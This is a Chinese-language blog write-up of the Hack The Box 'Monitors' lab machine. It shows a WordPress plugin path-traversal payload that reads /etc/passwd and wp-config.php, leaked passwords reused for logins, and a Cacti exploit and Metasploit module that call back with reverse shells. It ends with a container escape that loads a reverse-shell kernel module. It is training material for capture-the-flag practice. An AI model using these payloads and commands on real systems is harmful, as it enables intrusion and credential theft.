@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Monitors - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Monitors靶场信息  靶场类型  信息搜集Nmap首先使用nmap进行信息搜集 nmap -A -sS -sC -sV 10.10.10.238  ┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV 10.10.10.238  Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Monitors - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Monitors靶场信息  靶场类型  信息搜集Nmap首先使用nmap进行信息搜集 nmap -A -sS -sC -sV 10.10.10.238  ┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV 10.10.10.238  Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/448916e6-78fb-4ed3-8caa-f96b8eb52e32.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/7d23f011-68e1-48c6-98ea-0700663601ec.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/8ffddb27-0550-4446-b71b-af8cddd58352.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/84ee98fa-49b9-4a8d-87e5-1247f355d849.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/e1542669-e868-4c29-8d08-61a8a8372aba.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/45b1fc2d-e38b-42db-86f0-1c3badd3ba53.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/9b50b428-4156-45e0-8d3c-c42c0b6a7268.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/3b1ec4a0-8f83-4450-ba19-e0bf171ccc18.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/3c81bbe9-5d17-41dd-b34b-34ac4215e66e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/f3580c24-5079-4342-801c-3fe8d476cca0.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/8ee0c557-5794-448e-948c-6d19270d7234.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/18fa0d8a-cabf-4be0-bb67-cf7ca0bf2733.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/cd8d7411-2fdb-41ee-8f54-50367629e98d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/9b99eb19-688f-4b0e-9619-c515a416a944.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/20d52fb9-1658-4681-a827-910d9193319d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/49a83570-a8d3-421b-a9b2-527de6e4a617.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/d0ab04e5-ffcc-4a08-8ffd-60dcbe9ac6d9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/636aa853-e834-4487-bb44-3b7db7abcd70.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/08a8b82b-8515-40a1-be7d-c975b0ecf363.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/b59d0937-aa7a-475a-afc4-971cd3513bb1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/78452e90-55e9-4a15-87c1-066f5d4d8e12.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/cd22e91f-5da5-4bd8-855d-852849b6a858.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/a6b0100d-1464-4c6c-8b90-00417cfab93e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/495e7f62-7e19-492f-8a33-6808eaaa313d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/83a8630e-2de7-41dc-ada8-7745f033e9d6.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/17860965-cb90-4cd7-86c2-d9221bfda1b7.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/4fd619b1-ee7f-484c-98ca-7fe529f2e472.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/7bf1d374-d52c-4dcf-bd33-fcf3456c1241.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/47f6404c-7c58-4e29-90b4-86c1a231c536.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/e82b6c37-75cc-4570-a263-49329aeedcc9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/050754f0-6dca-4c45-845d-65d397fca9d8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/69510738-7fcc-41f0-9ccc-2e864e10acfe.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/e55fadc6-fb2d-43b7-92f8-2576ab004146.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/5d88a727-941b-441c-a79d-8735ce6ce821.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/53721ed2-33c5-4546-91e1-dba8d2d1e6f1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/7227cc74-0f62-4bee-baa4-587bfda77351.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/31f2739d-d6ee-4dbe-9558-9deabe3ea1a4.png">
+<meta property="article:published_time" content="2021-06-24T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:46:58.791Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/448916e6-78fb-4ed3-8caa-f96b8eb52e32.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Monitors - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Monitors - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-06-24T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2021-06-24
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Monitors"><span class="post-toc-text">Hackthebox - Monitors</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Monitors"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Monitors - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-06-24 19:38:36" datetime="2021-06-24T11:38:36.000Z"  itemprop="datePublished">2021-06-24</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Monitors"><a href="#Hackthebox-Monitors" class="headerlink" title="Hackthebox - Monitors"></a>Hackthebox - Monitors</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a><strong>靶场信息</strong></h1><img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/448916e6-78fb-4ed3-8caa-f96b8eb52e32.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a><strong>靶场类型</strong></h1><img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/7d23f011-68e1-48c6-98ea-0700663601ec.png" class>
+
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a><strong>信息搜集</strong></h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>首先使用nmap进行信息搜集</p>
+<pre><code class="bash">nmap -A -sS -sC -sV 10.10.10.238
+</code></pre>
+<pre><code class="bash">┌──(root💀root)-[~/Desktop]
+└─# nmap -A -sS -sC -sV 10.10.10.238
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 03:09 CST
+Nmap scan report for 10.10.10.238
+Host is up (0.24s latency).
+Not shown: 998 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
+| 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
+|_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
+80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html; charset=iso-8859-1).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=6/25%OT=22%CT=1%CU=35010%PV=Y%DS=2%DC=T%G=Y%TM=60D4D89
+OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+TRACEROUTE (using port 1025/tcp)
+HOP RTT ADDRESS
+1 239.07 ms 10.10.14.1
+2 239.14 ms 10.10.10.238
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.56 seconds
+</code></pre>
+<p>我们可以看到，开启了22和80端口，咱们先去80端口看看</p>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/8ffddb27-0550-4446-b71b-af8cddd58352.png" class>
+
+<p>不允许使用IP进行访问，那咱们先添加一下hosts吧</p>
+<pre><code class="bash">echo 10.10.10.238 monitors.htb &gt; /etc/hosts
+</code></pre>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/84ee98fa-49b9-4a8d-87e5-1247f355d849.png" class>
+
+<p>然后访问monitors.htb，我们把目光放在右下角Powered by Wordpress</p>
+<p>这很明显的是wordpress啊，使用wpscan扫描看看</p>
+<pre><code class="bash">wpscan --url http://monitors.htb/ -e p,t,u
+</code></pre>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/e1542669-e868-4c29-8d08-61a8a8372aba.png" class>
+
+<p>咱们把目光放在这一行wp-with-spritz</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/45b1fc2d-e38b-42db-86f0-1c3badd3ba53.png" class>
+
+<p>找到了一个exp，咱们进去看看</p>
+<blockquote>
+<p><a href="https://www.exploit-db.com/exploits/44544" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44544</a></p>
+</blockquote>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h1><pre><code class="bash">1. Version Disclosure
+/wp-content/plugins/wp-with-spritz/readme.txt
+
+2. Source Code
+if(isset($_GET[&#39;url&#39;])){
+$content=file_get_contents($_GET[&#39;url&#39;]);
+
+3. Proof of Concept
+/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
+/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
+</code></pre>
+<p>根据这个exploit给出的验证，咱们试试是否可用</p>
+<pre><code class="bash">[http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd](http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd)
+</code></pre>
+<p>成功获取&#x2F;etc&#x2F;passwd文件</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/9b50b428-4156-45e0-8d3c-c42c0b6a7268.png" class>
+
+<p>然后只是一个Wordpress的站点，咱们直接试试是否可以查看它的配置文件</p>
+<pre><code class="bash">http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/var/www/wordpress/wp-config.php
+</code></pre>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/3b1ec4a0-8f83-4450-ba19-e0bf171ccc18.png" class>
+
+<p>成功获得数据库账户密码</p>
+<pre><code class="bash">DB_NAME = “wordpress”
+DB_USER = “wpadmin”
+DB_PASSWORD = “BestAdministrator@2020!”
+</code></pre>
+<p>该账户不存在于&#x2F;etc&#x2F;passwd内，所以应该是无法直接使用ssh进行登录的，咱们想想有没有其他办法进行getshell</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/3c81bbe9-5d17-41dd-b34b-34ac4215e66e.png" class>
+
+<p>尝试使用该账户登录后台，也不可行，好家伙这是逼我动真格了？</p>
+<p>我找到了一篇LFI转RCE的文章</p>
+<blockquote>
+<p><a href="https://infosecwriteups.com/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899" target="_blank" rel="noopener">https://infosecwriteups.com/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899</a></p>
+</blockquote>
+<p>咱们抓个包吧</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/f3580c24-5079-4342-801c-3fe8d476cca0.png" class>
+
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/8ee0c557-5794-448e-948c-6d19270d7234.png" class>
+
+<p>抓包后将我们自己自定义的1设置为爆破点，然后选择Numbers，设置从1到15</p>
+<p>正常来说是会看到一个比较大的包的，但我这里不知道为什么没有，所以我通过其他方式(FUZZ)跑出来了</p>
+<pre><code class="bash">[http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/000-default.conf](http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/000-default.conf)
+</code></pre>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/18fa0d8a-cabf-4be0-bb67-cf7ca0bf2733.png" class>
+
+<p>然后咱们获得了另一个域名</p>
+<p>cacti-admin.monitors.htb，咱们添加进hosts</p>
+<pre><code class="bash">echo 10.10.10.238 cacti-admin.monitors.htb &gt;&gt; /etc/hosts
+</code></pre>
+<p>然后咱们访问一下<a href="http://cacti-admin.monitors.htb/" target="_blank" rel="noopener">http://cacti-admin.monitors.htb/</a></p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/cd8d7411-2fdb-41ee-8f54-50367629e98d.png" class>
+
+<p>这个仙人掌界面，我估计我们之前读取到的账号密码可以起作用了</p>
+<p>用户名：admin</p>
+<p>密码：BestAdministrator@2020!</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/9b99eb19-688f-4b0e-9619-c515a416a944.png" class>
+
+<p>可总算是登录进后台了</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/20d52fb9-1658-4681-a827-910d9193319d.png" class>
+
+<p>让我们点一下这个仙人掌检查一下版本</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/49a83570-a8d3-421b-a9b2-527de6e4a617.png" class>
+
+<p>版本1.2.12</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/d0ab04e5-ffcc-4a08-8ffd-60dcbe9ac6d9.png" class>
+
+<p>在github上找到了一个相关的问题</p>
+<p>漏洞编号 CVE-2020-14295</p>
+<p>这里是确定存在一个注入漏洞，让我们来尝试一下</p>
+<p>使用该exploit</p>
+<blockquote>
+<p><a href="https://www.exploit-db.com/exploits/49810" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/49810</a></p>
+</blockquote>
+<p>看看是否可以直接获得一个shell</p>
+<pre><code class="bash">python3 exploit.py -t http://cacti-admin.monitors.htb -u admin -p &quot;BestAdministrator@2020\!&quot; --lhost 10.10.14.163 --lport 4444
+</code></pre>
+<p>tips:此处密码的感叹号要用反斜杠进行转义，不然会被编译掉</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/636aa853-e834-4487-bb44-3b7db7abcd70.png" class>
+
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/08a8b82b-8515-40a1-be7d-c975b0ecf363.png" class>
+
+<p>成功获得一个shell</p>
+<p>可以使用python3 -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”;获取一个更加稳定的shell</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a><strong>权限提升</strong></h1><img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/b59d0937-aa7a-475a-afc4-971cd3513bb1.png" class>
+
+<p>咱们可以看到，只有marcus的目录咱们可以看到，所以咱们肯定是要获取这个用户的权限了</p>
+<pre><code class="bash">grep &#39;marcus&#39; /etc -R 2&gt;/dev/null
+</code></pre>
+<p>咱们查找一下相关的文件</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/78452e90-55e9-4a15-87c1-066f5d4d8e12.png" class>
+
+<p>咱们找到一个脚本</p>
+<pre><code class="bash">/home/marcus/.backup/backup.sh
+</code></pre>
+<p>查看一下</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/cd22e91f-5da5-4bd8-855d-852849b6a858.png" class>
+
+<p>咱们获得了一个密码</p>
+<pre><code class="bash">VerticalEdge2020
+</code></pre>
+<p>应该是marcus用户的密码，咱们去使用ssh登录试试</p>
+<pre><code class="bash">ssh [marcus@10.10.10.238](mailto:marcus@10.10.10.238)
+</code></pre>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/a6b0100d-1464-4c6c-8b90-00417cfab93e.png" class>
+
+<p>登录成功</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/495e7f62-7e19-492f-8a33-6808eaaa313d.png" class>
+
+<p>成功获得user权限的flag</p>
+<p>咱们查看一下note.txt文件</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/83a8630e-2de7-41dc-ada8-7745f033e9d6.png" class>
+
+<p>这个提示提到了docker，那咱们去查看一下docker吧</p>
+<p>ps aux|grep docker</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/17860965-cb90-4cd7-86c2-d9221bfda1b7.png" class>
+
+<p>我看到一个使用 docker-proxy 运行的 docker 容器。所以我搜索了一些关于 dokcer-proxy 的信息</p>
+<p>我找到的参考文本</p>
+<blockquote>
+<p><a href="https://docs.docker.com/network/proxy/" target="_blank" rel="noopener">https://docs.docker.com/network/proxy/</a></p>
+</blockquote>
+<p>阅读文本后，知道了使用docker-proxy可以通过代理运行docker容器。</p>
+<p>知道这个信息后，让我们看看是否有无法从外部访问的端口运行着</p>
+<pre><code class="bash">netstat -an
+</code></pre>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/4fd619b1-ee7f-484c-98ca-7fe529f2e472.png" class>
+
+<p>有一个8443端口</p>
+<p>这应该就是docker-proxy正在侦听的端口了，我们使用ssh创建一个代理隧道</p>
+<pre><code class="bash">ssh -L 8443:127.0.0.1:8443 [marcus@10.10.10.238](mailto:marcus@10.10.10.238)
+</code></pre>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/7bf1d374-d52c-4dcf-bd33-fcf3456c1241.png" class>
+
+<p>然后咱们去访问<a href="https://127.0.0.1:8443/" target="_blank" rel="noopener">https://127.0.0.1:8443</a></p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/47f6404c-7c58-4e29-90b4-86c1a231c536.png" class>
+
+<p>会看到有一个tomcat服务器</p>
+<p>尝试在Google查找漏洞后，经过努力找到了一个Java 反序列化</p>
+<blockquote>
+<p><a href="https://www.rapid7.com/db/modules/exploit/linux/http/apache_ofbiz_deserialization/" target="_blank" rel="noopener">https://www.rapid7.com/db/modules/exploit/linux/http/apache_ofbiz_deserialization&#x2F;</a></p>
+</blockquote>
+<p>如上所述，我将使用msf直接进行攻击</p>
+<pre><code class="bash">msfconsole启动msf
+exploit/linux/http/apache_ofbiz_deserialization
+set rhosts 127.0.0.1
+set lhost 10.10.14.163
+set lport 5555
+set ForceExploit true
+exploit
+</code></pre>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/e82b6c37-75cc-4570-a263-49329aeedcc9.png" class>
+
+<p>咱们成功利用反序列化漏洞以root权限在docker上获得了一个shell</p>
+<p>输入shell进入权限</p>
+<p>输入capsh –print查看容器的功能</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/050754f0-6dca-4c45-845d-65d397fca9d8.png" class>
+
+<p>你们猜猜我发现了啥？</p>
+<p>docker具有SYS_MODULE权限。因此，容器可以在docker主机的内核中插入&#x2F;删除内核模块</p>
+<p>然后我搜索了 docker sys_module 的漏洞，还真找到了</p>
+<blockquote>
+<p><a href="https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd?gi=c12387585c2" target="_blank" rel="noopener">https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd?gi=c12387585c2</a></p>
+</blockquote>
+<p>根据文章提示，我制作了两个脚本</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/69510738-7fcc-41f0-9ccc-2e864e10acfe.png" class>
+
+<p>记得修改IP地址和端口，我这里忘记修改了</p>
+<p>然后把脚本上传到docker里</p>
+<pre><code class="bash">python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
+</code></pre>
+<p>首先使用python获得一个稳定的shell</p>
+<p>然后进入&#x2F;root目录</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/e55fadc6-fb2d-43b7-92f8-2576ab004146.png" class>
+
+<p>在本地开启一个http服务器</p>
+<p>然后使用wget下载两个脚本</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/5d88a727-941b-441c-a79d-8735ce6ce821.png" class>
+
+<p>输入make all</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/53721ed2-33c5-4546-91e1-dba8d2d1e6f1.png" class>
+
+<p>输出了很多的文件，但我们只需要reverse-shell.ko</p>
+<p>首先我们使用nc监听一个端口</p>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<p>然后使用insmod reverse-shell.ko运行我们要的文件</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/7227cc74-0f62-4bee-baa4-587bfda77351.png" class>
+
+<p>成功提权到root</p>
+<img src="/2021/06/24/Hackthebox/Hackthebox-Monitors/31f2739d-d6ee-4dbe-9558-9deabe3ea1a4.png" class>
+
